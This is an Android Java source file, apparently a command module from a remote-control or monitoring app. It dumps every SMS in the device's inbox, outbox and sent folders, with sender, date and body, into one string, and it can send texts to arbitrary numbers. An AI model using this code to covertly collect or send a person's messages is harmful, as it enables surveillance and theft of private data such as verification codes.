package com.test.Modules;

import com.test.Models.*;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.telephony.SmsManager;

import androidx.annotation.NonNull;

import java.io.PrintWriter;
import java.io.Writer;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Locale;

public class SmsModule {

    // Входящие (content://sms/inbox), box = inbox
    // исходящие (content://sms/outbox), box = outbox
    // отправленные (content://sms/sent), box = sent

    // неудачные (content://sms/failed), box = failed
    // черновики (content://sms/draft), box = draft
    // недоставленные (content://sms/undelivered), box = undelivered
    // пребывающие в очереди (content://sms/queued), box = queued
    public static String dumpSms(@NonNull Context context, String box) {
        StringBuffer sb = new StringBuffer();

        SimpleDateFormat formatter = new SimpleDateFormat("yyyy.MM.dd HH:mm:ss", Locale.US);
        Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/"+box), null, null, null, null);
        try {
            // PrintWriter pw = Files.writeLines(file);
            if(cursor != null && cursor.moveToFirst()) {
                do {
                    String address = null;
                    String date = null;
                    String body = null;

                    for (int idx = 0; idx < cursor.getColumnCount(); idx++) {
                        switch (cursor.getColumnName(idx)) {
                            case "address":
                                address = cursor.getString(idx);
                                break;
                            case "date":
                                date = cursor.getString(idx);
                                break;
                            case "body":
                                body = cursor.getString(idx);
                        }
                    }
                    if (box.equals("inbox")) {
                        // pw.println("From: "+address);
                        sb.append("From: "+address+"\n");
                    } else {
                        // pw.println("To: "+address);
                        sb.append("To: "+address+"\n");
                    }
                    String dateString = formatter.format(new Date(Long.valueOf(date)));
                    //pw.println("Date: "+dateString);
                    sb.append("Date: "+dateString+"\n");
                    if (body != null) {
                        // pw.println("Body: "+body.replace('\n', ' '));
                        sb.append("Body: "+body.replace('\n', ' ')+"\n");
                    } else {
                        // pw.println("Body: ");
                        sb.append("Body: "+"\n");
                    }
                    // pw.println();
                    sb.append("\n----------------------------------\n");
                } while (cursor.moveToNext());
            }
            // pw.close();
            cursor.close();
            return sb.toString();
        } catch (Exception e) { e.printStackTrace(); }

        return null;
    }


    // sendSms()
    public static String sendSMS(String phoneNumber, String msg) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(phoneNumber, null, msg, null, null);

            return "The message has been sent successfully!";
        } catch (Exception ex) {

            // ex.printStackTrace();
            return ex.getMessage();
        }
    }

    // getSmsForToday()


    // getAllSms()
    public static String getAllSms(Context context) {
        StringBuffer allSms = new StringBuffer();
        allSms.append(dumpSms(context, "inbox"));
        allSms.append(dumpSms(context, "outbox"));
        allSms.append(dumpSms(context, "sent"));
        if(allSms.toString().length() == 0) {
            return "sms box empty";
        }

        return allSms.toString();
    }

    // getSmsForPeriod()
}
